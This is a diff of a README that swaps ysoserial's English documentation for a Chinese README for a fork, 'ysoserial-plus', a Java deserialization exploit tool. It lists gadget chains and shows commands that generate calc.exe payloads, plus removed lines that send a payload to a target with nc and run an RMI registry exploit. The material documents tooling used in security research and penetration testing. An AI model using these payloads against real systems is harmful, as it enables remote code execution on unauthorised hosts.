@@ -1,129 +1,96 @@
+# ysoserial-plus
 
-# ysoserial
+**核心职责**: Java 反序列化漏洞利用工具，用于生成针对常见 Java 库的恶意序列化 Payload。
 
-[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
-[![Travis Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/github/frohoff/ysoserial)
-[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
-[![JitPack](https://jitpack.io/v/frohoff/ysoserial.svg)](https://jitpack.io/#frohoff/ysoserial)
+## 项目概述
 
-A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
+ysoserial-plus 是一个用于生成 Java 反序列化漏洞利用 Payload 的工具集合。该工具通过构造特定的对象链（Gadget Chain），在目标应用反序列化恶意数据时触发任意代码执行。
 
-![logo](ysoserial.png)
+## 免责声明
 
-## Description
+⚠️ **本工具仅用于学术研究和防御技术开发，不得用于未经授权的系统攻击。项目维护者不对工具的滥用负责。请负责任地使用。**
 
-Originally released as part of AppSecCali 2015 Talk
-["Marshalling Pickles: how deserializing objects will ruin your day"](
-        https://frohoff.github.io/appseccali-marshalling-pickles/)
-with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
-Later updated to include additional gadget chains for
-[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.
+## 支持的 Gadget Chains
 
-__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
-libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
-objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
-serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
-this data, the chain will automatically be invoked and cause the command to be executed on the application host.
+该工具支持多种常见 Java 库的反序列化利用链，包括但不限于：
 
-It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
-gadgets on the classpath.
+- **Commons Collections** (3.1, 4.0)
+- **Spring Framework** (Core, Beans, AOP)
+- **Hibernate** (4.x, 5.x)
+- **Apache Wicket**
+- **Groovy**
+- **BeanShell**
+- **C3P0**
+- **ROME**
+- **Vaadin**
+- **AspectJ**
+- **Clojure**
+- **Jython**
+- **MyFaces**
 
-## Disclaimer
+## 快速开始
 
-This software has been created purely for the purposes of academic research and
-for the development of effective defensive techniques, and is not intended to be
-used to attack systems except where explicitly authorized. Project maintainers
-are not responsible or liable for misuse of the software. Use responsibly.
+### 构建项目
 
-## Usage
+```bash
+# 编译并打包
+mvn clean package -DskipTests
 
-```shell
-$  java -jar ysoserial.jar
-Y SO SERIAL?
-Usage: java -jar ysoserial.jar [payload] '[command]'
-  Available payload types:
-     Payload             Authors                     Dependencies
-     -------             -------                     ------------
-     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
-     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
-     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
-     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
-     Clojure             @JackOfMostTrades           clojure:1.8.0
-     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
-     CommonsCollections1 @frohoff                    commons-collections:3.1
-     CommonsCollections2 @frohoff                    commons-collections4:4.0
-     CommonsCollections3 @frohoff                    commons-collections:3.1
-     CommonsCollections4 @frohoff                    commons-collections4:4.0
-     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
-     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
-     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
-     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
-     Groovy1             @frohoff                    groovy:2.3.9
-     Hibernate1          @mbechler
-     Hibernate2          @mbechler
-     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     JRMPClient          @mbechler
-     JRMPListener        @mbechler
-     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
-     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     Jdk7u21             @frohoff
-     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
-     MozillaRhino1       @matthias_kaiser            js:1.7R2
-     MozillaRhino2       @_tint0                     js:1.7R2
-     Myfaces1            @mbechler
-     Myfaces2            @mbechler
-     ROME                @mbechler                   rome:1.0
-     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
-     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
-     URLDNS              @gebl
-     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
-     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
+# 生成的 JAR 文件位于 target/ 目录
+# ysoserial-0.0.6-SNAPSHOT-all.jar
 ```
 
-## Examples
+### 基本使用
 
-```shell
-$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
-0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
-0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
-0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
-...
-0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
-0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
-0000570: 0078 7071 007e 003a                      .xpq.~.:
+```bash
+# 查看所有可用的 Payload
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
 
-$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
-$ nc 10.10.10.10 1099 < groovypayload.bin
+# 生成 CommonsCollections1 Payload
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 "calc.exe"
 
-$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+# 将 Payload 输出到文件
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 "calc.exe" > payload.ser
 ```
 
-## Installation
+## 技术架构
 
-[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
+### 核心组件
 
-Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar) from GitHub releases.
+- **GeneratePayload**: 主入口类，负责 Payload 生成
+- **ObjectPayload**: Payload 接口，所有 Gadget Chain 实现此接口
+- **Serializer/Deserializer**: 序列化和反序列化工具类
+- **Exploit 模块**: 包含 JRMPListener、JRMPClient、JBoss 等利用工具
 
-## Building
+### 依赖管理
 
-Requires Java 1.7+ and Maven 3.x+
+- **Java 版本**: 1.8
+- **构建工具**: Maven 3.x
+- **主要依赖**: 
+  - Commons Collections (3.1, 4.0)
+  - Spring Framework (4.1.4)
+  - Hibernate (4.3.11)
+  - Javassist (3.19.0)
 
-```mvn clean package -DskipTests```
+## 使用场景
 
-## Code Status
+1. **安全研究**: 研究 Java 反序列化漏洞原理
+2. **渗透测试**: 在授权范围内测试应用安全性
+3. **防御开发**: 开发和测试反序列化漏洞防御机制
+4. **漏洞验证**: 验证已知 CVE 漏洞的影响范围
 
-[![Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/github/frohoff/ysoserial)
-[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
+## 已知问题
 
-## Contributing
+- [ ] 依赖版本较旧（Spring 4.1.4, Hibernate 4.3.11）
+- [ ] 部分 Gadget Chain 可能在新版本 JDK 中失效
+- [ ] 缺少对 JDK 9+ 模块化系统的适配
 
-1. Fork it
-2. Create your feature branch (`git checkout -b my-new-feature`)
-3. Commit your changes (`git commit -am 'Add some feature'`)
-4. Push to the branch (`git push origin my-new-feature`)
-5. Create new Pull Request
+## 相关资源
 
-## See Also
-* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
-* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
-* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
+- [原始项目](https://github.com/frohoff/ysoserial)
+- [Java 反序列化漏洞原理](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
+- [OWASP 反序列化备忘录](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
+
+## 许可证
+
+本项目遵循原始 ysoserial 项目的许可证条款。详见 LICENSE 文件。
